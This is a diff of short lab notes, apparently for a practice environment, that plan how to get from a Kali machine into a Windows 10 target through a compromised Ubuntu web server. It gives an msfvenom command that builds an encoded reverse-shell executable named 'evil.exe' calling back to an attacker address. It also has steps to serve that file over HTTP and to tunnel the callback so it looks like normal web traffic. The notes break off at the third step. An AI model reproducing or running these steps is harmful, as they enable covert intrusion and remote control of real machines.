@@ -1,14 +1,16 @@
-OCO-lab test
+Kali-lab test
 
 Goal:  
-How to get access to <TARGET> from [Kali] and make it look like normal web traffic from Windows 10 back to "compromised Web-Srvr."
---See first diagram below.*
+- Gain access from <Kali> to <TARGET>/(Win-10) through a web-server.
+How:
+- From <TARGET>; view Ubuntu "compromised-web-srvr"; download "evil.exe" and have traffic appear as normal web traffic.
+	--See first diagram below.*
 
 Idea #1:
 --------
 1) From: kali [msfconsole]--
 	#> msfvenom -p windows/shell/reverse_tcp -a x86 -e x86/shikata_ga_nai -f exe LHOST=10.0.0.30 LPORT=5959 > evil.exe
-2) Host "evil.exe" on UbUntu-VM (/home/ubuntu/Public)
+2) From: UbUntu [/home/ubuntu/Public] -- Host "evil.exe" on UbUntu-VM (/home/ubuntu/Public)
 	#> python3 -m http.server 8080
 3) Setup SSH Reverse Tunnel from Kali <--> UbUntu to receive the callback
    From: kali
